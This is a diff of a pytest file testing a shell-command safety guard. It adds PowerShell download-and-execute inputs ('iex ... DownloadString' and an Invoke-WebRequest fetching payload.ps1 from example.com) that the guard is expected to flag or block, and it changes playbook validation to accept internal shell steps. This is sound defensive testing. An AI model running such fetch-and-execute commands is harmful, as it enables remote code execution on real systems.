@@ -208,7 +208,7 @@ def test_public_action_guard_blocks_internal_transport():
     assert "reserved for internal orchestration" in str(exc_info.value.detail)
 
 
-def test_global_shell_safety_flags_download_but_allows_admin_operation():
+def test_global_shell_safety_flags_download_but_allows_admin_operation(monkeypatch):
     download = assess_command_safety(
         "Invoke-WebRequest -Uri https://example.com/payload.ps1 -OutFile $env:TEMP\\payload.ps1",
         shell="powershell",
@@ -218,29 +218,45 @@ def test_global_shell_safety_flags_download_but_allows_admin_operation():
     assert download["risk_score"] >= 48
     assert "Direct network transfer command" in download["reasons"]
 
+    relaxed = enforce_command_safety(
+        "iex (New-Object Net.WebClient).DownloadString('https://example.com/x')",
+        shell="powershell",
+    )
+    assert relaxed["blocked"] is True
+
+    monkeypatch.setenv("C2F_ENFORCE_SHELL_SAFETY_BLOCKS", "true")
     with pytest.raises(HTTPException) as exc_info:
         enforce_command_safety("iex (New-Object Net.WebClient).DownloadString('https://example.com/x')", shell="powershell")
-
     assert exc_info.value.status_code == 400
     assert "blocked by safety guard" in str(exc_info.value.detail).lower()
 
 
-def test_playbook_validation_blocks_internal_shell_steps():
-    with pytest.raises(HTTPException) as exc_info:
-        playbooks_api._validated_playbook_steps(
-            {
-                "steps": [
-                    {
-                        "id": "step_1",
-                        "action": "custom-os-command",
-                        "args": {"command": "Write-Host nope"},
-                    }
-                ]
-            }
-        )
+def test_playbook_validation_allows_internal_shell_steps():
+    direct = playbooks_api._validated_playbook_steps(
+        {
+            "steps": [
+                {
+                    "id": "step_1",
+                    "action": "custom-os-command",
+                    "args": {"command": "Write-Host nope"},
+                }
+            ]
+        }
+    )
+    assert direct[0]["action"] == "custom-os-command"
 
-    assert exc_info.value.status_code == 400
-    assert "blocked action" in str(exc_info.value.detail).lower()
+    alias = playbooks_api._validated_playbook_steps(
+        {
+            "steps": [
+                {
+                    "id": "step_1",
+                    "action": "global-shell",
+                    "args": {"command": "Write-Host alias"},
+                }
+            ]
+        }
+    )
+    assert alias[0]["action"] == "custom-os-command"
 
 
 def test_execute_serializes_custom_os_command_targets():
